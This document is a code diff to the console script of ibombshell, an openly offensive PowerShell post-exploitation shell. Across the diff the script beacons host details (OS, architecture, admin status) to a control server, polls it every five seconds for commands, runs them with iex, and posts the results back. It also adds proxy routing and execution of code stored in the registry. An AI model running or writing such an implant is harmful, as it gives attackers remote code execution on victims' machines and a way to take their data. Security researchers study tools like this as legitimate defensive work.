@@ -1,12 +1,17 @@
-
-
 function console{
  
     param(
         [Switch] $Silently,
         [String] $uriConsole,
-        [String] $id
+        [String] $id,
+        [String] $proxy
     )
+
+    if ($proxy){ 
+        if(-not $proxy.startswith("http")){
+            $proxy = "http://"+$proxy
+        }
+    }
 
      if ($PSVersionTable.PSVersion.Major -lt 3) {
 	  return "Upgrade your powershell to version 3 or higher"
@@ -23,10 +28,80 @@ function console{
         )
 
         $RawURL = $RawBase + $RawFunctions + $command
-
-        return (iwr -UseBasicParsing -Headers @{"Cache-Control"="no-cache"}  -uri $RawURL).Content
-
+        return make_request -URL $RawURL
     }
+
+    function make_request{
+        param(
+            [string] $method="GET",
+            [Parameter(Mandatory)]
+            [string] $URL,
+            [string] $data
+        )
+        $wc = new-object system.net.WebClient
+        if ($proxy){
+            $prx = new-object System.Net.WebProxy
+            $prx.Address = $proxy
+            $wc.proxy = $prx
+        }
+
+        if ($method -eq "POST"){
+            $wc.UploadString($url, "POST", $data)
+        } else{
+            $webpage = $wc.DownloadData($url)
+            $data = [System.Text.Encoding]::ASCII.GetString($webpage)
+            return $data
+        }
+    }
+
+    # READFUNCTIONS BEGIN
+    function readFunctions{
+                $path = 'HKCU:\Software\Classes\ibombshell'
+                $path_internals = 'hkcu:\software\classes\ibombshell\internals'
+                
+                # Internal
+                $null = (runRead -path $path_internals -isCommand $false) 
+
+                # No Internal
+                $code = (runRead -path $path -isCommand $true)    
+
+                return $code          
+    }
+    
+    function runRead{
+            param(
+                [Parameter(Mandatory)]
+                [String] $path,
+                [Parameter(Mandatory)]
+                [Boolean] $isCommand
+            )
+
+            if(test-path $path)
+            { 
+                $listFunctions = (Get-ChildItem $path).Name
+                $code = ""
+                cd hkcu:
+
+                foreach($i in $listFunctions)
+                { 
+                    $name = $i.split("\")[-1]
+                    if (($name -ne "internals") -and ($name -ne "console")){
+                        $aux = ((Get-Item -Path "$i" | Select-Object -ExpandProperty Property) | ForEach-Object {
+                        New-Object psobject -Property @{"property"=$_;
+                        "Value" = (Get-ItemProperty -Path "$i" -Name $_).$_}}).Value
+                        
+                        if (-not $isCommand) {
+                            $aux | out-string | iex
+                        } else {
+                            $code += ($aux | out-string) + "`r`n"
+                            addCommand -command $name > $null
+                        } 
+                    }
+                }                            
+                    c:
+                    return $code
+            }
+    } # READFUNCTIONS END
 
     $banner = "
       ,--.!,    _ ____                  __   _____ __         ____
@@ -41,6 +116,7 @@ function console{
     $gtRawFunctions = "data/functions/"
     $functionsList = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/functions.txt"
     [System.Collections.ArrayList]$global:functionsLoaded = "showcommands" , "showfunctions" , "quit"
+    [System.Collections.ArrayList]$global:internalFunctions =  "detect-OS", "printprompt" , "printMessage", "printData", "isadmin", "commandsearch", "addcommand"
     #Condition for exit
     $global:condition = $true
 
@@ -66,8 +142,8 @@ function console{
         }
 
         $info = Get-CimInstance -ClassName Win32_OperatingSystem
-        $os_version = $info.caption | Out-String
-        $os_arch = $info.OSArchitecture | Out-String
+        $os_version = ($info.caption | Out-String).TrimEnd("`r`n")
+        $os_arch = ($info.OSArchitecture | Out-String).TrimEnd("`r`n")
 
         #i am new warrior
         if($uriConsole.Length -ne 0)
@@ -77,8 +153,13 @@ function console{
             {
                 try 
                 {
-                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin/$os_version/$os_arch"
-                    #iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$admin}
+
+                $info = @"
+results={"os_version":"$os_version", "os_arch":"$os_arch", "admin":"$admin"}
+"@
+
+
+                    $req = make_request -method "POST" -URL "$uriConsole/newibombshell/$id" -data $info
                     break
                 }
                 catch 
@@ -88,12 +169,34 @@ function console{
             }
         }
     }
-    else{
-        #getting function's list
-        $list = (new-object net.webclient).downloadstring($functionsList)
-        loader -command "system/detect-OS" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-    
-         $detected_os = detect-OS -basic 
+    else{     
+        $path = 'hkcu:\software\classes\ibombshell'
+        if((Test-Path $path)){
+            readfunctions | iex  > $null
+        }else{
+            #loader functions default
+            try{
+                $toLoad = "system/detect-OS", "showfunctions", "showcommands", "addcommand", "commandsearch", "quit", "saveandloadfunctions", "version", "isadmin", "print/printprompt", "print/messagedata"
+                foreach($function in $toLoad){
+                    loader -command $function -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                }
+                addcommand -command "savefunctions" > $null
+                addcommand -command "deletefunctionsreg" > $null
+                addcommand -command "version" > $null
+            }catch {
+                write-host "Check Internet Connection"
+                sleep 1
+             }
+        }
+
+        try{
+            #getting function's list
+            $list = make_request -URL $functionsList
+        }catch{
+               $list = "" 
+        }
+
+        $detected_os = detect-OS -basic 
         if($detected_os -eq "windows") {
 	        $delimet = "`n"
             $delimet2 = "`r`n"
@@ -103,21 +206,7 @@ function console{
         }
         $global:commandList = $list.split($delimet)
 	    $localcommandlist = $list.split($delimet2)
-        #loader functions default
-        loader -command "showfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "showcommands" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "addcommand" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "commandsearch" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "quit" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "saveandloadfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "version" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "print/printprompt" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "print/messagedata" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        addcommand -command "savefunctions"
-        addcommand -command "deletefunctionsreg"
-        addcommand -command "version"
-        readfunctions | iex
+
         clear-host
         write-host -ForegroundColor Yellow $banner
         write-host 
@@ -137,7 +226,7 @@ function console{
             {
                 try 
                 {
-                    $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
+                    $content = make_request -URL "$uriConsole/ibombshell/$id"
                 } 
                 catch 
                 {
@@ -154,7 +243,7 @@ function console{
                 { 
                     $results = $content | iex
            
-                    if (-not $results) {$results = "Completed"}
+                    if (-not $results) {$results = "Executed. No results have been returned from the command"}
                     #Send results
                     if ($results.GetType().Name -ne "String")
                     {
@@ -165,17 +254,13 @@ function console{
                         }
                         $results = $send
                     }
-                    iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
+                    $results = @"
+results=$results
+"@
+                    $r = make_request -method "POST" -URL "$uriConsole/ibombshell/$id"  -data $results
                 } 
-
-                
-                sleep 5
             }
-            else
-            {
-                sleep 5
-            }
-            
+            sleep 5
         }
         else
         {
@@ -190,13 +275,21 @@ function console{
                 cls | iex
                 continue
             } 
-            if ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded)-and($command.Split(" ")[0].Equals("loaderext")))
+            if ($command.startswith("#")){
+                $c = $command.split("#")
+                if ($c.Length -gt 1){
+                    $c = $c[1].Trim()
+                    if ($c){
+                        $c | iex
+                    }
+                }
+            }
+            elseif ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded) -and ($command.Split(" ")[0].Equals("loaderext")))
             {
                 $command | iex | iex
             }
             elseif (commandsearch -command $command.split(" ")[0] -list $functionsLoaded)
             {
-                #$command
                 $command | iex
             }
             elseif (commandsearch -command $command -list $localcommandlist)
@@ -204,11 +297,10 @@ function console{
                 try {
                     $result = addcommand -command $command 
                     if ($result -ne -1) {
-                        #loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions
                         loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                         printMessage -message "Function Loaded"
                     }else{
-                    printMessage -message "That function is already loaded"
+                        printMessage -message "That function is already loaded"
                     }
                 } catch {
                     printMessage -message "Something went wrong loading the module"
@@ -222,5 +314,4 @@ function console{
             }
         }
     }
-
 }
